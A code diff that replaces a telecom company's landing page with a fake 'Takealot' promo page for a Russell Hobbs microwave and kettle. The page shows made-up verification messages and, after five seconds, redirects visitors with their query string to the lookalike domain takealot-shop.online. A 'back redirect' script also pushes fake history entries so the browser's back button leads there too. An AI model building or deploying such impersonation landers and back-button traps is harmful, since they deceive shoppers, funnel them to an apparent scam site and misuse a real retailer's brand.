@@ -1,63 +1,279 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Scorpio Telecoms | Modern Connectivity</title>
-  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet" />
-  <script>
-    window.tailwind.config = {
-      theme: {
-        extend: {
-          colors: {
-            "primary": "#10b981",
-            "primary-hover": "#059669",
-            "border-light": "#f1f5f9",
-            "text-muted": "#64748b",
-          },
-          fontFamily: {
-            "sans": ["Inter", "sans-serif"]
-          },
-        },
-      },
-    }
-  </script>
-  <style type="text/css">
-    .no-scrollbar::-webkit-scrollbar { display: none; }
-    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
-    html { scroll-behavior: smooth; }
-    
-    .card-pattern {
-      background-image: url(https://lh3.googleusercontent.com/aida-public/AB6AXuAFwajcFmH4vW2K43G-5V9pWLwKgWEtUyWPEw16enbjsqvoVK0PINf69huYTayZY7Nf4WS1iUgDj_K27kcpxaRHlgzpFfJMq0Qk8WJCUXiKKkZqnnJ7slrSl1UfxJJb4j6lhS7AjgQWa4XJkQm7aYzWqqYiaa0Uoh3Re_or85N8hPWRoaQII-b7g6iWIOBgy-MKf1B0iC_nGp7o1tkwZvW0ULH-_dAqguuldKy32AFMfpnicS4eg8mBGFf_5X1xGhnXi9oRNeniHMpr);
-      background-size: 100px;
-    }
-    
-    .lifestyle-overlay {
-      background: linear-gradient(90deg, rgba(255, 255, 255, 1) 0%, rgba(255, 255, 255, 0.95) 40%, rgba(255, 255, 255, 0) 100%);
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Takealot | Processing Hot Promo...</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --tk-blue: #0B79BF;
+            --tk-dark: #121212;
+            --tk-grey: #4C4C4E;
+            --glass: rgba(0, 0, 0, 0.03);
+            --premium-gradient: linear-gradient(135deg, #0b79bf 0%, #064d7a 100%);
+        }
 
-    .material-symbols-outlined {
-      font-variation-settings: "FILL" 0, "wght" 200, "GRAD" 0, "opsz" 20;
-      vertical-align: middle;
-    }
-  </style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
 
-<link rel="stylesheet" href="/index.css">
-<script type="importmap">
-{
-  "imports": {
-    "react/": "https://esm.sh/react@^19.2.4/",
-    "react": "https://esm.sh/react@^19.2.4",
-    "react-dom/": "https://esm.sh/react-dom@^19.2.4/"
-  }
-}
-</script>
-  <script type="module" crossorigin src="/assets/index-BOfRGlUs.js"></script>
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: var(--tk-dark);
+            position: relative;
+        }
+
+        /* Animated Background */
+        .bg-glow {
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 50% 50%, rgba(11, 121, 191, 0.05) 0%, transparent 50%);
+            animation: pulseBg 8s infinite alternate ease-in-out;
+            z-index: 0;
+        }
+
+        @keyframes pulseBg {
+            0% {
+                transform: scale(1) translate(-10%, -10%);
+                opacity: 0.3;
+            }
+
+            100% {
+                transform: scale(1.2) translate(5%, 5%);
+                opacity: 0.6;
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2.5rem 2rem;
+            max-width: 420px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            background: #ffffff;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo-wrapper {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        .logo-container {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 24px;
+            display: inline-block;
+            box-shadow: 0 10px 40px rgba(11, 121, 191, 0.15);
+            animation: logoFloat 3s infinite ease-in-out;
+            border: 1px solid rgba(0, 0, 0, 0.03);
+        }
+
+        .logo-container img {
+            width: 160px;
+            display: block;
+        }
+
+        @keyframes logoFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
+
+            50% {
+                transform: translateY(-8px) scale(1.01);
+            }
+        }
+
+        .promo-badge {
+            display: inline-block;
+            background: #ff3b30;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 800;
+            padding: 5px 14px;
+            border-radius: 100px;
+            margin-bottom: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 4px 12px rgba(255, 59, 48, 0.3);
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+
+            80% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            font-weight: 800;
+            font-size: 1.6rem;
+            margin-bottom: 0.6rem;
+            color: var(--tk-dark);
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 2.5rem;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        /* Loading Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--tk-blue);
+            box-shadow: 0 0 15px rgba(11, 121, 191, 0.3);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        .status-text {
+            font-size: 0.75rem;
+            color: var(--tk-blue);
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 2px;
+            height: 20px;
+        }
+
+        /* Micro-animations */
+        .dots {
+            display: inline-block;
+            width: 15px;
+            text-align: left;
+        }
+    </style>
 </head>
-<body class="bg-white text-slate-900 antialiased">
-  <div id="root"></div>
+
+<body>
+
+    <div class="bg-glow"></div>
+
+    <div class="container">
+        <div class="logo-wrapper">
+            <div class="logo-container">
+                <img src="logo-takealot.svg" alt="Takealot">
+            </div>
+        </div>
+
+        <div class="promo-badge">HOT PROMO</div>
+
+        <h1>Processing Offer</h1>
+        <p>Verifying exclusive Russell Hobbs 20L Electronic Microwave + Cordless Stainless Steel Kettle RHSSK05...</p>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+
+        <div class="status-text" id="status">STARTING...</div>
+    </div>
+
+    <script>
+        const statusEl = document.getElementById('status');
+        const progressEl = document.getElementById('progress');
+
+        const statuses = [
+            "Connecting to server...",
+            "Locating liquidation batch...",
+            "Validating promo code...",
+            "Reserving your unit...",
+            "Redirecting..."
+        ];
+
+        let currentStatus = 0;
+        let progress = 0;
+        const duration = 5000; // 5 seconds confirmed
+        const startTime = Date.now();
+
+        function update() {
+            const elapsed = Date.now() - startTime;
+            progress = Math.min((elapsed / duration) * 100, 100);
+            progressEl.style.width = progress + '%';
+
+            // Change status text based on progress
+            const statusIndex = Math.min(
+                Math.floor((progress / 100) * statuses.length),
+                statuses.length - 1
+            );
+
+            if (statusIndex !== currentStatus) {
+                currentStatus = statusIndex;
+                statusEl.innerText = statuses[currentStatus].toUpperCase();
+            }
+
+            if (progress < 100) {
+                requestAnimationFrame(update);
+            } else {
+                setTimeout(() => {
+                  window.location.href = 'https://micro.takealot-shop.online/' + location.search;
+                }, 500);
+            }
+        }
+
+        // Wait slightly before starting
+        setTimeout(() => {
+            update();
+        }, 500);
+    </script>
+     <!-- BACK REDIRECT -->
+<script>
+  var back_redirect_back_link =
+    "https://micro.takealot-shop.online/" + location.search;
+
+  history.pushState({}, "", location.href);
+  history.pushState({}, "", location.href);
+
+  window.addEventListener("popstate", function(event) {
+    if (event.state) {
+      setTimeout(function () {
+        location.href = back_redirect_back_link;
+      }, 1);
+    }
+  }, false);
+</script>
 </body>
+
+
 </html>
